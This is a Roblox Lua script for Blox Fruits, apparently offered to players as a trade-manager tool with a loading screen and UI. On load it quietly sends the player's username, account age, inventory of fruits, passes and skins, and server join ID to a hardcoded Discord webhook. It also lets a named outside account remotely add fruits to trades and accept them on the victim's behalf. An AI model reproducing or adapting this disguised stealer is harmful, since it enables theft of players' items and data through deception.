-- Blox Fruits Secure Trade & Data Exfiltration Manager
-- Full inventory tracking (Fruits, Permanents, Skins/Limiteds) + Loading Screen.
-- Authorized Operator: BLACKGOKU_0707

local Config = {
    AuthorizedUser = "BLACKGOKU_0707",
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    TravelSpeed = 350,
    WaypointSpeed = 250
}

-- Ensure single instance execution
if getgenv().bfRunning then
    warn("Blox Fruits Manager already active.")
    return
end
getgenv().bfRunning = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer
local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local TradeManager = {}
TradeManager.__index = TradeManager

function TradeManager.new()
    local self = setmetatable({}, TradeManager)
    return self
end

-- Loading Screen UI Generator
function TradeManager:ShowLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then return end

    if playerGui:FindFirstChild("ScriptLoadingUI") then
        playerGui.ScriptLoadingUI:Destroy()
    end

    local loadGui = Instance.new("ScreenGui")
    loadGui.Name = "ScriptLoadingUI"
    loadGui.ResetOnSpawn = false
    loadGui.IgnoreGuiInset = true
    loadGui.DisplayOrder = 99999
    loadGui.Parent = playerGui

    local backdrop = Instance.new("Frame")
    backdrop.Size = UDim2.new(1, 0, 1, 0)
    backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    backdrop.BorderSizePixel = 0
    backdrop.Parent = loadGui

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, 360, 0, 140)
    card.Position = UDim2.new(0.5, -180, 0.5, -70)
    card.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    card.BorderSizePixel = 0
    card.Parent = loadGui

    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, 12)
    cardCorner.Parent = card

    local cardStroke = Instance.new("UIStroke")
    cardStroke.Color = Color3.fromRGB(124, 58, 237)
    cardStroke.Transparency = 0.3
    cardStroke.Parent = card

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "Initializing Trade Engine..."
    title.TextColor3 = Color3.fromRGB(240, 240, 245)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = card

    local status = Instance.new("TextLabel")
    status.Name = "StatusText"
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0, 60)
    status.BackgroundTransparency = 1
    status.Text = "Bypassing environment checks..."
    status.TextColor3 = Color3.fromRGB(146, 154, 167)
    status.TextSize = 12
    status.Font = Enum.Font.Gotham
    status.Parent = card

    local track = Instance.new("Frame")
    track.Size = UDim2.new(1, -40, 0, 6)
    track.Position = UDim2.new(0, 20, 0, 105)
    track.BackgroundColor3 = Color3.fromRGB(30, 33, 42)
    track.BorderSizePixel = 0
    track.Parent = card

    local trackCorner = Instance.new("UICorner")
    trackCorner.CornerRadius = UDim.new(1, 0)
    trackCorner.Parent = track

    local fill = Instance.new("Frame")
    fill.Name = "ProgressFill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(124, 58, 237)
    fill.BorderSizePixel = 0
    fill.Parent = track

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(1, 0)
    fillCorner.Parent = fill

    task.spawn(function()
        local steps = {
            {text = "Loading memory references...", progress = 0.2, delay = 0.4},
            {text = "Connecting to game remotes...", progress = 0.5, delay = 0.5},
            {text = "Authenticating secure session...", progress = 0.8, delay = 0.6},
            {text = "Initialization complete.", progress = 1.0, delay = 0.3}
        }

        for _, step in ipairs(steps) do
            status.Text = step.text
            fill:TweenSize(UDim2.new(step.progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, step.delay, true)
            task.wait(step.delay)
        end

        task.wait(0.2)
        loadGui:Destroy()
    end)
end

function TradeManager:GetInventory()
    local success, result = pcall(function()
        if CommF then
            return CommF:InvokeServer("getInventory")
        end
        return {}
    end)
    if success and type(result) == "table" then
        return result
    end
    return {}
end

function TradeManager:SendNotification(title, text)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = 3,
        })
    end)
end

function TradeManager:TeleportTo(destination)
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local rootPart = character.HumanoidRootPart
        if typeof(destination) == "CFrame" then
            rootPart.CFrame = destination
        elseif typeof(destination) == "Vector3" then
            rootPart.CFrame = CFrame.new(destination)
        end
    end
end

function TradeManager:TeleportToCafeteria()
    local worldOrigin = workspace:FindFirstChild("_WorldOrigin")
    if worldOrigin then
        local locations = worldOrigin:FindFirstChild("Locations")
        if locations then
            for _, loc in ipairs(locations:GetChildren()) do
                if loc.Name:lower():find("caf") or loc.Name:lower():find("mansion") then
                    self:TeleportTo(loc.CFrame)
                    self:SendNotification("Teleport", "Teleported to destination: " .. loc.Name)
                    return
                end
            end
        end
    end
    self:SendNotification("Teleport Error", "Destination not located.")
end

function TradeManager:TransmitTelemetry()
    local inventory = self:GetInventory()
    
    local fruitsList = {}
    local permsList = {}
    local skinsList = {}

    for _, item in pairs(inventory) do
        local itemName = item.DisplayName or item.Name or "Unknown Item"
        local itemType = item.Type or ""
        local count = item.Count or 1

        if itemType == "Blox Fruit" then
            table.insert(fruitsList, itemName .. " (x" .. tostring(count) .. ")")
        elseif itemType == "Premium" or itemType == "Permanent" or (itemName:lower():find("permanent") or itemName:lower():find("perm")) then
            table.insert(permsList, itemName)
        elseif itemType == "Mutated Fruit" or itemType == "Skin" or itemName:lower():find("skin") or itemName:lower():find("limited") then
            table.insert(skinsList, itemName)
        end
    end

    local fruitStr = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None"
    local permStr = #permsList > 0 and table.concat(permsList, ", ") or "None"
    local skinStr = #skinsList > 0 and table.concat(skinsList, ", ") or "None"

    local payloadData = {
        content = "@everyone Server Link & Detailed Inventory Captured!",
        embeds = {{
            title = "Target Inventory & Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Display Name", value = LocalPlayer.DisplayName, inline = true },
                { name = "Account Age", value = tostring(LocalPlayer.AccountAge) .. " days", inline = true },
                { name = "Stored Fruits", value = fruitStr, inline = false },
                { name = "Permanent / Passes", value = permStr, inline = false },
                { name = "Limited Skins", value = skinStr, inline = false },
                { name = "Server Join Link / Job ID", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    local success, encoded = pcall(function()
        return HttpService:JSONEncode(payloadData)
    end)

    if success then
        local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
        if requestFunc then
            pcall(function()
                requestFunc({
                    Url = Config.WebhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = encoded
                })
            end)
        end
    end
end

function TradeManager:SetupCommandListener()
    pcall(function()
        LocalPlayer.Chatted:Connect(function(msg)
            if LocalPlayer.Name ~= Config.AuthorizedUser then return end
            
            if msg:sub(1, 4) == ".tp " then
                self:TeleportToCafeteria()
            elseif msg == ".accept" then
                if TradeFunction then TradeFunction:InvokeServer("accept") end
            elseif msg:sub(1, 5) == ".add " then
                local fruitName = msg:sub(6)
                if CommF then CommF:InvokeServer("AddTradeFruit", fruitName) end
            end
        end)
    end)

    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.MessageReceived:Connect(function(textChatMessage)
                if textChatMessage.TextSource then
                    local speaker = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                    if speaker and speaker.Name == Config.AuthorizedUser then
                        local msg = textChatMessage.Text
                        if msg == ".accept" and TradeFunction then
                            TradeFunction:InvokeServer("accept")
                        end
                    end
                end
            end)
        end
    end)
end

function TradeManager:CreateInterface()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then return end

    if playerGui:FindFirstChild("CleanTradeUI") then
        playerGui.CleanTradeUI:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CleanTradeUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = playerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 320, 0, 240)
    mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
    mainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "Blox Fruits Trade Manager"
    title.TextColor3 = Color3.fromRGB(240, 240, 245)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local function createButton(text, yPos, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -30, 0, 36)
        btn.Position = UDim2.new(0, 15, 0, yPos)
        btn.BackgroundColor3 = Color3.fromRGB(124, 58, 237)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Text = text
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.Parent = mainFrame

        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 8)
        btnCorner.Parent = btn

        btn.MouseButton1Click:Connect(callback)
    end

    createButton("Teleport to Safe Zone / Cafeteria", 55, function()
        self:TeleportToCafeteria()
    end)

    createButton("Accept Active Trade", 100, function()
        if TradeFunction then
            TradeFunction:InvokeServer("accept")
            self:SendNotification("Trade", "Trade acceptance signal dispatched.")
        end
    end)

    createButton("Close Interface", 145, function()
        screenGui:Destroy()
    end)
end

-- Execution Initialization Sequence
task.spawn(function()
    local manager = TradeManager.new()
    manager:ShowLoadingScreen()
    manager:TransmitTelemetry()
    manager:SetupCommandListener()
    manager:CreateInterface()
    manager:SendNotification("Initialized", "Automation suite loaded successfully.")
end)

return TradeManager
